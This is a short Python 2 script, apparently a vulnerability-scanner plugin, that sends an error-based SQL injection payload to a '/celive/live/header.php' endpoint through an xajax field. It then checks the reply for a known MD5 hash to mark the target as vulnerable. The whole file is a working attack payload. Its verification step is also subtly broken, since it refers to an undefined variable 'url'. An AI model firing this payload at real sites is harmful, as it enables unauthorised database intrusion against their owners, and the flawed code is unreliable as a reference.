#!/usr/bin/env python
# -*- coding: utf-8 -*-

import urllib
import requests

def exploit(arg):
    target = arg + '/celive/live/header.php'
    post_data = {
        'xajax': 'LiveMessage',
        'xajaxargs[0][name]': "1',(SELECT 1 FROM (select count(*),concat("
                              "floor(rand(0)*2),(select md5(233)))a from "
                              "information_schema.tables group by a)b),"
                              "'','','','1','127.0.0.1','2') #"
    }
    # 通过 hackhttp 发送 Payload 到目标
    r = requests.post(target , data=post_data)
    # 验证是否存在漏洞
    try:
        r = requests.get(url , timeout=5)
        if 'caf1a3dfb505ffed0d024130f58c5cfa' in r.text:
            msg = 'vul'
            return True, arg, msg
        else:
            msg = 'safe'
            return False, arg, msg
    except Exception, e:
        msg = 'safe'
        return False, arg, msg
